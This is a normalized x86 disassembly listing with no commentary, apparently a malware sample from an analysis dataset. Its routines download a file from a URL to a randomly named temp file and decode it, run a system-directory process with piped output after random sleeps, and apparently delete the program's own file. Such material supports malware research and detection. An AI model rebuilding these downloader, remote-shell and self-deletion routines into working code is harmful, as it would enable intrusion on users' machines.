call sub_404572
mov ebx eax
xor eax eax
mov [ ebx ] eax
mov [ ebx + 0x4 ] eax
add esp 0x4
mov [ ebx + 0x8 ] ax
call sub_4050af
xor esi esi
mov eax 0x2
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4042ed
mov esp ebp
pop ebp
retn
call sub_4050af
cdq
mov ecx 0x19
idiv ecx
inc esi
add dl 0x61
mov [ esi + ebx - 0x1 ] dl
cmp esi 0x8
jl r-xdata
mov eax ebx
mov edx ebx
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ ebp - 0x108 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
lea eax [ ebp - 0x108 ]
[ edi ] [ esi ]
dec eax
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov edx [ r--data ]
mov cl [ r--data ]
mov [ eax ] edx
push ebx
mov [ eax + 0x4 ] cl
call sub_404538
lea edx [ ebp - 0x108 ]
push r--data
push edx
call sub_404e1f
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov edi [ ebp - 0x514 ]
lea eax [ ebp - 0x50c ]
push eax
push 0x400
lea ecx [ ebp - 0x508 ]
push ecx
push edi
call [ rw-data ]
test eax eax
je r-xdata
pop edi
lea eax [ esi + 0x3 ]
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4042ed
mov esp ebp
pop ebp
retn
push esi
call sub_405649
mov esi [ InternetCloseHandle@IAT ]
add esp 0x4
push edi
call esi
mov edx [ ebp - 0x510 ]
push edx
call esi
mov eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x108 ]
push ecx
mov ecx [ ebp - 0x518 ]
call sub_4034d0
add esp 0x8
test eax eax
jne r-xdata
mov eax [ ebp - 0x50c ]
test eax eax
je r-xdata
lea eax [ ebp - 0x108 ]
push eax
call [ DeleteFileA@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_4042ed
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x108 ]
push edx
call [ DeleteFileA@IAT ]
pop edi
pop esi
mov eax 0x5
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4042ed
mov esp ebp
pop ebp
retn
push esi
push eax
lea edx [ ebp - 0x508 ]
push 0x1
push edx
call sub_405227
push esi
call sub_404c5b
add esp 0x14
lea eax [ ebp - 0x50c ]
push eax
push 0x400
lea ecx [ ebp - 0x508 ]
push ecx
push edi
call [ rw-data ]
test eax eax
jne r-xdata
sub_4034d0
push ebp
mov ebp esp
sub esp 0x1a4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push edi
push r--data
push eax
mov [ ebp - 0x1a4 ] ecx
mov [ ebp - 0x19c ] 0xbcb702ff
call sub_404e1f
mov edi eax
add esp 0x8
test edi edi
jne r-xdata
push ebx
push esi
push 0x2
push 0xfffffffa
push edi
call sub_405560
push edi
push 0x4
lea edx [ ebp - 0x1a0 ]
push 0x1
push edx
call sub_405080
mov eax [ ebp - 0x1a0 ]
movzx ecx [ ebp - 0x19e ]
movzx edx [ ebp - 0x19d ]
movzx esi al
shl esi 0x8
movzx eax ah
add esi eax
shl esi 0x8
add esi ecx
push 0x2
push 0x0
shl esi 0x8
push edi
add esi edx
call sub_405560
push edi
call sub_405471
mov ebx eax
push 0x0
mov eax 0xfffffff6
sub eax esi
push esi
push edi
add ebx eax
call sub_405560
push edi
push 0x4
lea ecx [ ebp - 0x198 ]
push 0x1
push ecx
call sub_405080
mov edx [ ebp - 0x198 ]
add esp 0x48
cmp edx [ ebp - 0x19c ]
jne r-xdata
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4042ed
mov esp ebp
pop ebp
retn
push edi
push 0x191
lea eax [ ebp - 0x198 ]
push 0x0
push eax
call sub_40aef0
add esp 0xc
push edi
cmp ebx 0x190
ja r-xdata
call sub_405649
mov ecx [ ebp - 0x4 ]
add esp 0x4
pop esi
pop ebx
xor ecx ebp
xor eax eax
pop edi
call sub_4042ed
mov esp ebp
pop ebp
retn
push ebx
lea ecx [ ebp - 0x198 ]
push 0x1
push ecx
call sub_405080
push edi
call sub_405649
add esp 0x14
xor eax eax
test ebx ebx
jle r-xdata
mov eax [ ebp + 0xc ]
mov esi [ ebp - 0x1a4 ]
push eax
lea ecx [ ebp - 0x198 ]
push esi
push ecx
mov eax ebx
call sub_401e60
add esp 0xc
mov [ esi + eax ] 0x0
pop esi
pop ebx
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4042ed
mov esp ebp
pop ebp
retn
jmp r-xdata
mov dl [ ebp + eax - 0x198 ]
not dl
mov [ ebp + eax - 0x198 ] dl
inc eax
cmp eax ebx
jl r-xdata
sub_403660
push ebp
mov ebp esp
sub esp 0x514
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push 0x0
push 0x0
push 0x0
push 0x0
push rw-data
mov esi ecx
mov [ ebp - 0x514 ] eax
call [ InternetOpenA@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4042ed
mov esp ebp
pop ebp
retn
push 0x0
push 0x84000100
push 0x0
push 0x0
push esi
push ebx
call [ InternetOpenUrlA@IAT ]
mov [ ebp - 0x50c ] eax
test eax eax
jne r-xdata
push edi
lea ecx [ ebp - 0x108 ]
push ecx
push 0x104
call [ GetTempPathA@IAT ]
push 0xa
call sub_404572
mov edi eax
xor eax eax
mov [ edi ] eax
mov [ edi + 0x4 ] eax
add esp 0x4
mov [ edi + 0x8 ] ax
call sub_4050af
xor esi esi
push ebx
call [ InternetCloseHandle@IAT ]
call sub_4050af
cdq
mov ecx 0x19
idiv ecx
inc esi
add dl 0x61
mov [ esi + edi - 0x1 ] dl
cmp esi 0x8
jl r-xdata
mov eax edi
mov edx edi
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ ebp - 0x108 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
lea edx [ ebp - 0x108 ]
and ecx 0x3
push r--data
push edx
[ edi ] [ esi ]
call sub_404e1f
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
mov edx [ ebp - 0x50c ]
lea eax [ ebp - 0x510 ]
push eax
mov edi 0x400
push edi
lea ecx [ ebp - 0x508 ]
push ecx
push edx
call [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4042ed
mov esp ebp
pop ebp
retn
push esi
call sub_405649
mov edx [ ebp - 0x50c ]
mov esi [ InternetCloseHandle@IAT ]
add esp 0x4
push edx
call esi
push ebx
call esi
cmp [ ebp + 0xc ] 0x0
mov esi 0x1
lea eax [ ebp - 0x108 ]
je r-xdata
mov eax [ ebp - 0x510 ]
push esi
push eax
lea ecx [ ebp - 0x508 ]
push 0x1
push ecx
call sub_405227
push esi
call sub_404c5b
add esp 0x14
cmp [ ebp - 0x510 ] edi
jb r-xdata
mov edx [ ebp - 0x514 ]
push 0x0
push edx
push eax
call [ CopyFileA@IAT ]
mov esi eax
push r--data
push eax
call sub_404e1f
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x50c ]
lea edx [ ebp - 0x510 ]
push edx
push edi
lea eax [ ebp - 0x508 ]
push eax
push ecx
call [ rw-data ]
test eax eax
jne r-xdata
xor esi esi
jmp r-xdata
mov ecx [ ebp - 0x514 ]
push ecx
mov edi eax
call sub_403870
add esp 0x4
test eax eax
jne r-xdata
lea ecx [ ebp - 0x108 ]
push ecx
call [ DeleteFileA@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_4042ed
mov esp ebp
pop ebp
retn
sub_403870
push ebp
mov ebp esp
sub esp 0x410
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push 0x2
push 0xfffffffa
push edi
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x408 ] 0xb9b703ff
call sub_405560
push edi
push 0x4
lea ecx [ ebp - 0x40c ]
push 0x1
push ecx
call sub_405080
mov eax [ ebp - 0x40c ]
movzx ecx [ ebp - 0x409 ]
movzx esi al
shl esi 0x8
movzx edx ah
movzx eax [ ebp - 0x40a ]
add esi edx
shl esi 0x8
add esi eax
push 0x2
push 0x0
shl esi 0x8
push edi
add esi ecx
call sub_405560
push edi
call sub_405471
push 0x0
mov ebx 0xfffffff6
push esi
sub ebx esi
push edi
add ebx eax
call sub_405560
push edi
push 0x4
lea eax [ ebp - 0x404 ]
push 0x1
push eax
call sub_405080
mov ecx [ ebp - 0x404 ]
add esp 0x48
cmp ecx [ ebp - 0x408 ]
jne r-xdata
push edi
call sub_405649
mov ecx [ ebp - 0x4 ]
add esp 0x4
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_4042ed
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x410 ]
push r--data
push edx
xor esi esi
call sub_404e1f
add esp 0x8
mov [ ebp - 0x408 ] eax
test eax eax
je r-xdata
mov eax ebx
sub eax esi
push edi
cmp eax 0x400
jb r-xdata
push eax
push 0x1
lea ecx [ ebp - 0x404 ]
push ecx
push 0x400
push 0x1
lea eax [ ebp - 0x404 ]
push eax
jmp r-xdata
mov ecx [ ebp - 0x408 ]
push ecx
push eax
lea edx [ ebp - 0x404 ]
push 0x1
push edx
call sub_405227
mov eax [ ebp - 0x408 ]
push eax
call sub_404c5b
add esp 0x14
cmp esi ebx
jne r-xdata
mov edi edi
call sub_405080
add esp 0x10
add esi eax
xor ecx ecx
test eax eax
jle r-xdata
push edi
call sub_405649
mov ecx [ ebp - 0x408 ]
push ecx
call sub_405649
add esp 0x8
pop esi
mov eax ebx
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4042ed
mov esp ebp
pop ebp
retn
mov dl [ ebp + ecx - 0x404 ]
not dl
mov [ ebp + ecx - 0x404 ] dl
inc ecx
cmp ecx eax
jl r-xdata
sub_403a00
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x614
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x610 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ esp + 0x28 ]
xor ebx ebx
push eax
mov [ esp + 0x20 ] 0xc
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] 0x1
mov [ esp + 0x2c ] 0x44
call [ GetStartupInfoA@IAT ]
push ebx
xor ecx ecx
lea edx [ esp + 0x20 ]
push edx
lea eax [ esp + 0x1c ]
mov [ esp + 0x60 ] cx
push eax
lea ecx [ esp + 0x1c ]
push ecx
mov [ esp + 0x64 ] 0x101
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebx
call [ CreatePipe@IAT ]
mov eax [ esp + 0x14 ]
push 0x104
lea edx [ esp + 0x18c ]
push edx
mov [ esp + 0x70 ] eax
mov [ esp + 0x6c ] eax
call [ GetSystemDirectoryA@IAT ]
lea eax [ esp + 0x188 ]
dec eax
lea ecx [ ecx ]
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ eax ] ecx
mov ecx [ r--data ]
mov [ eax + 0x4 ] edx
mov dl [ r--data ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] dl
mov eax esi
mov ecx esi
nop
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
lea edi [ esp + 0x188 ]
sub eax ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
lea eax [ esp + 0x70 ]
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x2c ]
push ecx
push ebx
push ebx
push ebx
push 0x1
push ebx
push ebx
lea edx [ esp + 0x1a8 ]
push edx
push ebx
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
mov edx [ esp + 0x14 ]
push edx
call [ CloseHandle@IAT ]
call sub_4050af
cdq
mov ecx 0x1c2
idiv ecx
mov edi [ Sleep@IAT ]
lea esi [ edx + 0x1c2 ]
xor edx edx
cmp esi 0x64
setge dl
dec edx
and edx 0x64
lea eax [ edx + esi + 0x3e8 ]
push eax
call edi
mov eax [ esp + 0x10 ]
push ebx
mov ebx [ ReadFile@IAT ]
lea ecx [ esp + 0x1c ]
push ecx
push esi
lea edx [ esp + 0x29c ]
push edx
push eax
call ebx
test eax eax
je r-xdata
call [ GetLastError@IAT ]
push eax
lea eax [ esp + 0x84 ]
push r--data
push eax
call sub_404606
lea eax [ esp + 0x8c ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov ecx [ esp + 0x10 ]
push ecx
call [ CloseHandle@IAT ]
lea edx [ esp + 0x81 ]
push edx
push 0x103
mov [ esp + 0x88 ] 0xa
call [ GetCurrentDirectoryA@IAT ]
lea edi [ esp + 0x80 ]
dec edi
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
jmp r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov ax [ r--data ]
mov [ edi ] ax
lea eax [ esp + 0x80 ]
lea edx [ eax + 0x1 ]
nop
mov ecx [ esp + 0x18 ]
lea eax [ esp + 0x290 ]
mov [ esp + ecx + 0x290 ] 0x0
lea edx [ eax + 0x1 ]
push 0x4d
sub eax edx
push eax
lea ecx [ esp + 0x88 ]
push ecx
call sub_402f80
mov ecx [ esp + 0x628 ]
add esp 0xc
pop edi
pop esi
pop ebx
xor ecx esp
xor eax eax
call sub_4042ed
mov esp ebp
pop ebp
retn 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push 0x4d
push eax
lea edx [ esp + 0x298 ]
push edx
call sub_402f80
add esp 0xc
call sub_4050af
cdq
mov ecx 0x1c2
idiv ecx
lea esi [ edx + 0x1c2 ]
xor edx edx
cmp esi 0x64
setge dl
dec edx
and edx 0x64
lea eax [ edx + esi + 0x3e8 ]
push eax
call edi
mov eax [ esp + 0x10 ]
push 0x0
lea ecx [ esp + 0x1c ]
push ecx
push esi
lea edx [ esp + 0x29c ]
push edx
push eax
call ebx
test eax eax
jne r-xdata
sub_403cb0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_403ce0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40445e
add esp 0x4
sub_403ce0
push esi
mov esi ecx
mov eax [ esi + 0x34 ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
push eax
call sub_404538
add esp 0x4
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_404538
add esp 0x4
mov eax [ esi + 0x258 ]
test eax eax
je r-xdata
push eax
call sub_404538
add esp 0x4
mov eax [ esi + 0x25c ]
test eax eax
je r-xdata
push eax
call sub_404538
add esp 0x4
mov esi [ esi + 0x260 ]
test esi esi
je r-xdata
push eax
call sub_404538
add esp 0x4
pop esi
retn
push esi
call sub_404538
add esp 0x4
sub_403d60
mov ecx [ esi + 0x18 ]
cwde
shl eax cl
or [ esi + 0x14 ] eax
mov eax [ esi + 0x1c ]
add eax ecx
mov [ esi + 0x18 ] eax
cmp eax 0x8
jl r-xdata
mov dx [ esi + 0x32 ]
cmp dx [ esi + 0x20 ]
jle r-xdata
push edi
lea edi [ esi + 0x48 ]
lea ebx [ ebx ]
retn
inc [ esi + 0x1c ]
mov ecx [ esi + 0x1c ]
cmp ecx 0xc
jne r-xdata
sar [ esi + 0x14 ] 0x8
add [ esi + 0x18 ] 0xfffffff8
cmp [ esi + 0x18 ] 0x8
jge r-xdata
test eax eax
jle r-xdata
mov edx 0x1
shl dx cl
dec dx
mov [ esi + 0x20 ] dx
mov eax 0x1000
mov [ esi + 0x20 ] ax
retn
inc [ esi + 0x44 ]
mov eax [ esi + 0x44 ]
mov cl [ esi + 0x14 ]
mov [ edi + eax ] cl
mov eax [ esi + 0x44 ]
cmp eax 0xff
jl r-xdata
pop edi
mov dl al
inc eax
push eax
mov [ esi + 0x44 ] eax
mov eax [ esi + 0x4 ]
add eax [ esi + 0x10 ]
push edi
push eax
mov [ edi ] dl
call sub_40af70
mov ecx [ esi + 0x44 ]
add esp 0xc
add [ esi + 0x10 ] ecx
mov [ esi + 0x44 ] 0x0
sub_403e00
push ebp
mov ebp esp
push esi
push edi
push 0x2716
mov esi eax
call sub_404572
mov edi eax
push 0x2716
mov [ esi + 0x34 ] edi
call sub_404572
push 0x2716
mov [ esi + 0x38 ] eax
call sub_404572
mov [ esi + 0x3c ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax 0x9
mov [ esi + 0x28 ] eax
mov [ esi + 0x1c ] eax
xor eax eax
mov ecx 0x1ff
push 0x2716
mov [ esi + 0x20 ] cx
push eax
mov ecx 0x102
push edi
mov [ esi + 0x2c ] 0x1010100
mov [ esi + 0x32 ] cx
mov [ esi + 0x30 ] 0x1
mov [ esi + 0x44 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
call sub_40aef0
mov ax [ esi + 0x2c ]
add esp 0x18
call sub_403d60
pop edi
pop esi
pop ebp
retn 0x4
sub_403e90
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
push ebx
movzx ebx [ esi + 0x40 ]
shl ecx 0x4
add ecx ebx
push edi
movzx edi cx
mov edx 0x138b
cmp di dx
jl r-xdata
mov ax [ ebp + 0x8 ]
mov [ esi + 0x40 ] ax
mov [ esi + 0x30 ] 0x0
pop esi
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x34 ]
movsx ecx di
add ecx ecx
movzx edx [ eax + ecx ]
test dx dx
je r-xdata
sub edi edx
movzx eax [ esi + 0x40 ]
call sub_403d60
movzx ecx [ esi + 0x32 ]
mov eax 0x1000
cmp cx ax
jge r-xdata
mov eax [ esi + 0x38 ]
cmp [ eax + ecx ] bx
jne r-xdata
mov eax [ esi + 0x34 ]
push 0x2716
push 0x0
push eax
call sub_40aef0
movzx eax [ esi + 0x2c ]
lea ecx [ eax + 0x2 ]
add esp 0xc
mov [ esi + 0x32 ] cx
call sub_403d60
mov ecx [ esi + 0x28 ]
mov ax [ ebp + 0x8 ]
mov edx 0x1
shl dx cl
pop edi
pop ebx
mov [ esi + 0x1c ] ecx
dec dx
mov [ esi + 0x20 ] dx
mov [ esi + 0x40 ] ax
pop esi
mov esp ebp
pop ebp
retn 0x4
mov edx [ esi + 0x34 ]
movsx eax di
add eax eax
mov [ eax + edx ] cx
movzx edx [ esi + 0x40 ]
mov ecx [ esi + 0x38 ]
inc [ esi + 0x32 ]
mov [ eax + ecx ] dx
mov ecx [ esi + 0x3c ]
mov dx [ ebp + 0x8 ]
mov [ eax + ecx ] dx
pop edi
mov ax dx
pop ebx
mov [ esi + 0x40 ] ax
pop esi
mov esp ebp
pop ebp
retn 0x4
test di di
jne r-xdata
mov eax [ esi + 0x3c ]
mov cx [ ecx + eax ]
cmp cx [ ebp + 0x8 ]
je r-xdata
mov edx 0x138b
sub edx edi
movzx eax dx
mov [ ebp - 0x4 ] eax
nop
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
pop edi
pop ebx
mov [ esi + 0x40 ] dx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov edx [ esi + 0x34 ]
movsx ecx di
add ecx ecx
cmp [ edx + ecx ] 0x0
je r-xdata
add edi 0x138b
sub edi [ ebp - 0x4 ]
test di di
jns r-xdata
movzx ebx [ esi + 0x40 ]
mov eax [ esi + 0x38 ]
cmp [ eax + ecx ] bx
jne r-xdata
mov eax [ esi + 0x3c ]
mov bx [ ebp + 0x8 ]
cmp [ ecx + eax ] bx
jne r-xdata
movsx ecx di
mov dx [ edx + ecx * 2 ]
sub_403ff0
push esi
mov esi eax
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov ax [ esi + 0x2e ]
call sub_403d60
cmp [ esi + 0x18 ] 0x0
jle r-xdata
mov ax [ esi + 0x40 ]
call sub_403d60
mov ecx [ esi + 0x44 ]
test ecx ecx
jle r-xdata
inc [ esi + 0x44 ]
mov cl [ esi + 0x14 ]
mov eax [ esi + 0x44 ]
mov [ eax + esi + 0x48 ] cl
mov ecx [ esi + 0x44 ]
cmp ecx 0xff
jl r-xdata
pop esi
retn
mov dl cl
inc ecx
lea eax [ esi + 0x48 ]
push ecx
push eax
mov [ eax ] dl
mov eax [ esi + 0x4 ]
add eax [ esi + 0x10 ]
mov [ esi + 0x44 ] ecx
push eax
call sub_40af70
mov ecx [ esi + 0x44 ]
add esp 0xc
add [ esi + 0x10 ] ecx
mov [ esi + 0x44 ] 0x0
test ecx ecx
jle r-xdata
mov dl cl
inc ecx
lea eax [ esi + 0x48 ]
push ecx
push eax
mov [ eax ] dl
mov eax [ esi + 0x4 ]
add eax [ esi + 0x10 ]
mov [ esi + 0x44 ] ecx
push eax
call sub_40af70
mov ecx [ esi + 0x44 ]
add esp 0xc
add [ esi + 0x10 ] ecx
mov [ esi + 0x44 ] 0x0
sub_404090
push ebp
mov ebp esp
sub esp 0x34c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push 0x104
lea eax [ ebp - 0x108 ]
push eax
xor edi edi
push edi
call [ GetModuleFileNameA@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_4042ed
mov esp ebp
pop ebp
retn
push 0x104
lea ecx [ ebp - 0x108 ]
push ecx
mov edx ecx
push edx
call [ GetShortPathNameA@IAT ]
test eax eax
je r-xdata
push 0x104
lea eax [ ebp - 0x310 ]
push eax
push r--data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je r-xdata
push r--data
lea ecx [ ebp - 0x20c ]
push ecx
call [ lstrcpyA@IAT ]
mov esi [ lstrcatA@IAT ]
lea edx [ ebp - 0x108 ]
push edx
lea eax [ ebp - 0x20c ]
push eax
call esi
push r--data
lea ecx [ ebp - 0x20c ]
push ecx
call esi
mov [ ebp - 0x344 ] edi
lea edx [ ebp - 0x310 ]
lea eax [ ebp - 0x20c ]
mov [ ebp - 0x334 ] edi
mov [ ebp - 0x330 ] edi
mov edi [ GetCurrentProcess@IAT ]
push 0x100
mov [ ebp - 0x34c ] 0x3c
mov [ ebp - 0x340 ] r--data
mov [ ebp - 0x33c ] edx
mov [ ebp - 0x338 ] eax
mov [ ebp - 0x348 ] 0x40
call edi
mov esi [ SetPriorityClass@IAT ]
push eax
call esi
mov ebx [ GetCurrentThread@IAT ]
push 0xf
call ebx
push eax
call [ SetThreadPriority@IAT ]
lea ecx [ ebp - 0x34c ]
push ecx
call [ ShellExecuteExA@IAT ]
test eax eax
je r-xdata
push 0x20
call edi
push eax
call esi
push 0x0
call ebx
push eax
call [ SetThreadPriority@IAT ]
mov edx [ ebp - 0x314 ]
push 0x40
push edx
call esi
mov eax [ ebp - 0x314 ]
push 0x1
push eax
call [ SetProcessPriorityBoost@IAT ]
push 0x0
lea ecx [ ebp - 0x108 ]
push ecx
push 0x1
push 0x4
call [ SHChangeNotify@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4042ed
mov esp ebp
pop ebp
retn
sub_404220
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
mov edi eax
mov eax rw-data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
mov eax rw-data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov [ ebp - 0x8 ] eax
mov eax edi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
xor esi esi
mov [ ebp - 0x10 ] eax
test eax eax
jle r-xdata
mov edx [ ebp + 0x8 ]
pop edi
mov [ esi + edx ] 0x0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov eax edi
sub eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
lea ebx [ esi + ecx ]
movsx eax [ eax + ebx ]
push eax
push rw-data
call sub_4043a0
mov edi eax
mov eax esi
cdq
idiv [ ebp - 0x8 ]
sub edi rw-data
movsx eax [ edx + rw-data ]
push eax
push rw-data
call sub_4043a0
mov ecx [ ebp - 0xc ]
lea edx [ ecx + edi + rw-data ]
sub edx eax
mov eax edx
cdq
idiv ecx
inc esi
add esp 0x10
mov al [ edx + rw-data ]
mov [ ebx ] al
cmp esi [ ebp - 0x10 ]
jl r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
pop ebx
pop edi
mov [ esi + ecx ] 0x0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_404300
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp r-xdata
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
add esi 0x1
cmp al dl
je r-xdata
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
mov al [ esi ]
add esi 0x1
cmp al dh
jne r-xdata
test al al
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
add esi 0x1
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_4043a0
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_404474
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_405ae9
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
